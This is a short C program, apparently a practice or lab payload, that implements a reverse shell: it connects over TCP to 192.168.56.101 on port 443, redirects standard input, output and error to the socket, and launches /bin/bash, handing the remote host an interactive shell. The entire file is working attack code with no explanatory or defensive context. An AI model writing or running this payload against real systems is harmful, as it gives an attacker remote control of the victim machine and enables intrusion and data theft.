#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>


int main() {

    int sock_fd;
    int status_code;

    // Create addr struct to hold IP address and port
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    addr.sin_addr.s_addr = inet_addr("192.168.56.101");   

    
    // 1. Create TCP socket
    sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if (sock_fd == -1) {
        fprintf(stderr, "[!] Error. Cannot create the socket\n");
        exit(EXIT_FAILURE);
    }

    // 2. Connect to socket on target
    status_code = connect(sock_fd, (struct sockaddr *) &addr, sizeof(addr));
    if (status_code == -1) {
        fprintf(stderr, "[!] Error. Cannot connect to socket on target host\n");
        exit(EXIT_FAILURE);
    }

    // 3. Redirect stdin(0), stdout(1), stderr(2) to socket file descriptor (fd)
    dup2(sock_fd, 0);
    dup2(sock_fd, 1);
    dup2(sock_fd, 2);

    // 4. Exec bash shell
    execve("/bin/bash", NULL, NULL);
}
